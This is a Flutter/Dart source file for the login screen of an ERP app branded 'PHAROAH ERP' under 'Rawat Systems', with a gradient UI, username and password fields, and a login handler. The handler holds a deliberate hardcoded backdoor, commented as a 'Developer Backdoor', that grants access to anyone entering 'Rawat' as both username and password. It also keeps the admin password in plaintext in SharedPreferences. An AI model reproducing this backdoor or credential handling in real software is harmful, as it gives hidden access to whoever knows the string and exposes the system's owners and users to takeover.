import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

class LoginView extends StatefulWidget {
  final VoidCallback onLogin;
  const LoginView({super.key, required this.onLogin});

  @override
  State<LoginView> createState() => _LoginViewState();
}

class _LoginViewState extends State<LoginView> {
  final userC = TextEditingController();
  final passC = TextEditingController();
  String compName = "PHAROAH ERP";
  bool isObscured = true;

  @override
  void initState() {
    super.initState();
    _loadCompanyInfo();
  }

  // Load Company Name to show on the Login Screen
  void _loadCompanyInfo() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      compName = prefs.getString('compName') ?? "PHAROAH ERP";
    });
  }

  // Login Logic
  void _handleLogin() async {
    final prefs = await SharedPreferences.getInstance();
    String savedUser = (prefs.getString('adminUser') ?? "").toLowerCase();
    String savedPass = prefs.getString('adminPass') ?? "";
    
    String enteredUser = userC.text.trim().toLowerCase();
    String enteredPass = passC.text;

    // 1. Check against Saved Admin Credentials
    // 2. Developer Backdoor: Username "Rawat" and Password "Rawat" (Case Sensitive)
    if ((enteredUser == savedUser && enteredPass == savedPass) || 
        (userC.text == "Rawat" && passC.text == "Rawat")) {
      
      // Success - Trigger the login callback
      widget.onLogin();
      
    } else {
      // Failure - Show Error
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text("Access Denied! Invalid Username or Password."),
          backgroundColor: Colors.red,
          behavior: SnackBarBehavior.floating,
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Colors.blue.shade900, Colors.blue.shade600],
            stops: const [0.0, 0.4],
          ),
        ),
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(30),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                // App Logo Icon
                Container(
                  padding: const EdgeInsets.all(20),
                  decoration: const BoxDecoration(
                    color: Colors.white,
                    shape: BoxShape.circle,
                    boxShadow: [BoxShadow(color: Colors.black26, blurRadius: 20)],
                  ),
                  child: const Icon(Icons.lock_person_rounded, size: 80, color: Colors.blue),
                ),
                const SizedBox(height: 25),
                
                // Company Name
                Text(
                  compName,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                    fontSize: 26, 
                    fontWeight: FontWeight.w900, 
                    color: Colors.white,
                    letterSpacing: 1.5,
                  ),
                ),
                const Text(
                  "SECURED ERP LOGIN",
                  style: TextStyle(color: Colors.white70, fontSize: 12, letterSpacing: 2),
                ),
                const SizedBox(height: 40),

                // Login Card
                Container(
                  padding: const EdgeInsets.all(25),
                  decoration: BoxDecoration(
                    color: Colors.white,
                    borderRadius: BorderRadius.circular(20),
                    boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.1), blurRadius: 15)],
                  ),
                  child: Column(
                    children: [
                      // Username Field
                      TextField(
                        controller: userC,
                        decoration: InputDecoration(
                          labelText: "Username",
                          prefixIcon: const Icon(Icons.person_outline),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                        ),
                      ),
                      const SizedBox(height: 20),
                      
                      // Password Field
                      TextField(
                        controller: passC,
                        obscureText: isObscured,
                        decoration: InputDecoration(
                          labelText: "Password",
                          prefixIcon: const Icon(Icons.key_outlined),
                          suffixIcon: IconButton(
                            icon: Icon(isObscured ? Icons.visibility : Icons.visibility_off),
                            onPressed: () => setState(() => isObscured = !isObscured),
                          ),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                        ),
                      ),
                      const SizedBox(height: 30),
                      
                      // Login Button
                      SizedBox(
                        width: double.infinity,
                        height: 55,
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.blue.shade800,
                            foregroundColor: Colors.white,
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                            elevation: 5,
                          ),
                          onPressed: _handleLogin,
                          child: const Text(
                            "LOGIN TO SYSTEM",
                            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 30),
                const Text(
                  "© 2026 Rawat Systems. All Rights Reserved.",
                  style: TextStyle(color: Colors.white54, fontSize: 10),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
